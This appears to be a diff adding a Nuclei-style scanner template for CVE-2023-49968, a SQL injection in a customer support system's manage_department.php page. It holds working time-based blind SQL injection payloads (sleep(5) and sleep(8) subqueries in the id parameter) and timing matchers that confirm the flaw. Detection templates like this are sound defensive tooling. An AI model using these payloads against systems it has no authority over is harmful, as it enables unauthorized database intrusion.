@@ -1,0 +1,29 @@
+id: cve-2023-49968
+
+info:
+  name: "客户支持系统 manage_department.php SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 客户支持系统
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/customer_support/manage_department.php?id=(select*from(select(sleep(5)))a)"
+      - "{{BaseURL}}/customer_support/manage_department.php?id=(select*from(select(sleep(8)))a)"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"manage_department.php\""
+          - "Name"
+          - "Warning"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
